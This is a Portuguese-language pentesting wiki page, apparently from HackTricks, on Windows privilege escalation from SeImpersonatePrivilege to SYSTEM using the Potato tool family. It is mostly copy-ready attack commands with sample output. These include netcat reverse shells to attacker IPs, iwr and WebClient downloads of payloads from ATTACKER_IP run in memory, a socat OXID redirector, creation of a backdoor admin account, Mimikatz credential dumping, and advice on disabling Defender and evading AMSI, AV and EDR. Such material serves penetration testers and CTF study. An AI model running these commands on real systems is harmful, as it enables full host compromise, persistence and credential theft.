# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato não funciona** no Windows Server 2019 e no Windows 10 build 1809 em diante. No entanto, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** podem ser usados para **aproveitar os mesmos privilégios e obter acesso no nível de `NT AUTHORITY\SYSTEM`**. Esta [publicação do blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) explica em detalhes a ferramenta `PrintSpoofer`, que pode ser usada para abusar de privilégios de impersonation em hosts Windows 10 e Server 2019 nos quais o JuicyPotato deixou de funcionar.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Uma alternativa moderna mantida frequentemente em 2024–2025 é o SigmaPotato (um fork do GodPotato), que adiciona o uso de reflection em memória/.NET e suporte ampliado a sistemas operacionais. Veja o uso rápido abaixo e o repositório em References.

Páginas relacionadas para contexto e técnicas manuais:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos e problemas comuns

Todas as técnicas a seguir dependem do abuso de um serviço privilegiado capaz de impersonation a partir de um contexto que tenha um destes privilégios:

- SeImpersonatePrivilege (mais comum) ou SeAssignPrimaryTokenPrivilege
- High integrity não é necessário se o token já tiver SeImpersonatePrivilege (típico de muitas contas de serviço, como IIS AppPool, MSSQL etc.)

Verifique os privilégios rapidamente:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operacionais:

- Se seu shell estiver sendo executado sob um token restrito sem SeImpersonatePrivilege (comum para Local Service/Network Service em alguns contextos), recupere os privilégios padrão da conta usando FullPowers e execute um Potato. Exemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer precisa que o serviço Print Spooler esteja em execução e acessível pelo endpoint RPC local (spoolss). Em ambientes reforçados nos quais o Spooler foi desabilitado após o PrintNightmare, prefira RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requer um resolvedor OXID acessível na porta TCP/135. Se o tráfego de saída estiver bloqueado, use um redirector/port-forwarder (veja o exemplo abaixo). Builds mais antigos precisavam da flag -f.
- EfsPotato/SharpEfsPotato abusam do MS-EFSR; se um pipe estiver bloqueado, tente pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- O erro 0x6d3 durante RpcBindingSetAuthInfo normalmente indica um serviço de autenticação RPC desconhecido/não suportado; tente outro pipe/transporte ou verifique se o serviço de destino está em execução.
- Forks “Kitchen-sink”, como DeadPotato, incluem módulos de payload adicionais (Mimikatz/SharpHound/Defender off) que gravam no disco; espere uma detecção maior pelo EDR em comparação com os originais slim.

## Demonstração rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Observações:
- Você pode usar `-i` para iniciar um processo interativo no console atual ou `-c` para executar um one-liner.
- Requer o serviço Spooler. Se estiver desabilitado, isso falhará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se a porta 135 de saída estiver bloqueada, faça pivot do resolvedor OXID via socat no seu redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato é uma primitiva mais recente de abuso de COM, lançada no final de 2022, que tem como alvo o serviço **PrintNotify** em vez do Spooler/BITS. O binário instancia o servidor COM do PrintNotify, substitui um `IUnknown` falso e então aciona um callback privilegiado por meio de `CreatePointerMoniker`. Quando o serviço PrintNotify (executado como **SYSTEM**) se conecta de volta, o processo duplica o token retornado e inicia o payload fornecido com privilégios totais.<sup>[[13]](#references)</sup>

Principais observações operacionais:

* Funciona no Windows 10/11 e no Windows Server 2012–2022, desde que o serviço Print Workflow/PrintNotify esteja instalado (ele permanece presente mesmo quando o Spooler legado está desabilitado após o PrintNightmare).
* Requer que o contexto de chamada tenha o **SeImpersonatePrivilege** (algo típico de IIS APPPOOL, MSSQL e contas de serviço de tarefas agendadas).
* Aceita um comando direto ou um modo interativo, permitindo permanecer dentro do console original. Exemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Como é totalmente baseado em COM, não são necessários listeners de named pipe nem redirectors externos, tornando-o um substituto direto em hosts nos quais o Defender bloqueia o binding RPC do RoguePotato.

Operadores como Ink Dragon executam o PrintNotifyPotato imediatamente após obter ViewState RCE no SharePoint para fazer pivot do worker `w3wp.exe` para SYSTEM antes de instalar o ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Dica: Se um pipe falhar ou o EDR bloqueá-lo, tente os outros pipes compatíveis:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona no Windows 8/8.1–11 e no Server 2012–2022 quando SeImpersonatePrivilege está presente.
- Obtenha o binário correspondente ao runtime instalado (por exemplo, `GodPotato-NET4.exe` em versões modernas do Server 2022).
- Se o primitivo de execução inicial for um webshell/UI com timeouts curtos, prepare o payload como um script e peça ao GodPotato para executá-lo em vez de usar um comando inline longo.<sup>[[12]](#references)</sup>

Padrão rápido de staging a partir de um webroot gravável do IIS:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornece duas variantes direcionadas a objetos DCOM de serviço que usam RPC_C_IMP_LEVEL_IMPERSONATE por padrão. Compile ou use os binários fornecidos e execute seu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork atualizado do GodPotato)

O SigmaPotato adiciona recursos modernos, como execução em memória via reflection do .NET e um helper de reverse shell do PowerShell.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Recursos adicionais nas builds de 2024–2025 (v1.2.x):
- Flag integrada de reverse shell `--revshell` e remoção do limite de 1024 caracteres do PowerShell, permitindo disparar payloads longos que fazem bypass do AMSI de uma só vez.
- Sintaxe compatível com Reflection (`[SigmaPotato]::Main()`), além de um truque rudimentar de AV evasion usando `VirtualAllocExNuma()` para confundir heurísticas simples.
- `SigmaPotatoCore.exe` separado, compilado para .NET 2.0, destinado a ambientes com PowerShell Core.

### DeadPotato (reimplementação do GodPotato de 2024 com módulos)

DeadPotato mantém a cadeia de impersonation OXID/DCOM do GodPotato, mas incorpora helpers de post-exploitation para que os operadores possam obter SYSTEM imediatamente e realizar persistência/coleta sem ferramentas adicionais.<sup>[[15]](#references)</sup>

Módulos comuns (todos exigem SeImpersonatePrivilege):

- `-cmd "<cmd>"` — inicia um comando arbitrário como SYSTEM.
- `-rev <ip:port>` — reverse shell rápido.
- `-newadmin user:pass` — cria um administrador local para persistência.
- `-mimi sam|lsa|all` — grava e executa Mimikatz para extrair credenciais (toca no disco e gera ruído).
- `-sharphound` — executa a coleta do SharpHound como SYSTEM.
- `-defender off` — desativa a proteção em tempo real do Defender (muito ruidoso).

Exemplos de one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Como ele inclui binários extras, espere mais alertas de AV/EDR; use o GodPotato/SigmaPotato, mais enxuto, quando o stealth for importante.

## Referências

- [1] [PrintSpoofer – Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [No more JuicyPotato? Old story, welcome RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
